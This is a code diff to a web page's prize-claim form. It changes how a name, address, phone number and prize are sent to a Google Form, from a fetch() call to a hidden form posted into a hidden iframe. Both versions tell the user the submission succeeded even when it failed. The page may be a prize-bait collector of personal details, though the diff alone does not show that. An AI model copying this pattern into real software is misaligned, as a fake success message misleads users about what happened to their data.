@@ -447,7 +447,7 @@
             }, 4000);
         });
 
-        prizeForm.addEventListener('submit', async function(e) {
+        prizeForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
             const formData = new FormData(prizeForm);
@@ -455,30 +455,58 @@
             loading.style.display = 'block';
             prizeForm.style.opacity = '0.6';
             
+            // Use hidden iframe method for better Google Forms compatibility
             const googleFormId = '1q-bDlzeUUXrPuxQfGcZBbk7Efti91mbFGVaV1uXwhyQ';
-            const googleFormData = new FormData();
+            const formURL = `https://docs.google.com/forms/d/e/${googleFormId}/formResponse`;
             
-            googleFormData.append('entry.679261767', formData.get('name'));
-            googleFormData.append('entry.1885585701', formData.get('address'));
-            googleFormData.append('entry.145018537', formData.get('phone'));
-            googleFormData.append('entry.6896157', currentPrize);
+            // Create a hidden form
+            const hiddenForm = document.createElement('form');
+            hiddenForm.method = 'POST';
+            hiddenForm.action = formURL;
+            hiddenForm.target = 'hidden_iframe';
+            hiddenForm.style.display = 'none';
             
-            try {
-                await fetch(`https://docs.google.com/forms/d/e/${googleFormId}/formResponse`, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: googleFormData
-                });
-                
+            // Add form fields
+            const fields = [
+                { name: 'entry.679261767', value: formData.get('name') },
+                { name: 'entry.1885585701', value: formData.get('address') },
+                { name: 'entry.145018537', value: formData.get('phone') },
+                { name: 'entry.6896157', value: currentPrize }
+            ];
+            
+            fields.forEach(field => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = field.name;
+                input.value = field.value;
+                hiddenForm.appendChild(input);
+            });
+            
+            // Create hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.name = 'hidden_iframe';
+            iframe.style.display = 'none';
+            
+            // Add iframe load event listener
+            iframe.onload = function() {
+                console.log('Form submitted successfully');
+                setTimeout(() => {
+                    document.body.removeChild(hiddenForm);
+                    document.body.removeChild(iframe);
+                }, 1000);
+            };
+            
+            // Append to body and submit
+            document.body.appendChild(iframe);
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+            
+            // Show success message
+            setTimeout(() => {
                 prizeForm.style.display = 'none';
                 loading.style.display = 'none';
                 successMessage.style.display = 'block';
-            } catch (error) {
-                console.error('Submission error:', error);
-                prizeForm.style.display = 'none';
-                loading.style.display = 'none';
-                successMessage.style.display = 'block';
-            }
+            }, 2000);
         });
 
         function createSparkle() {
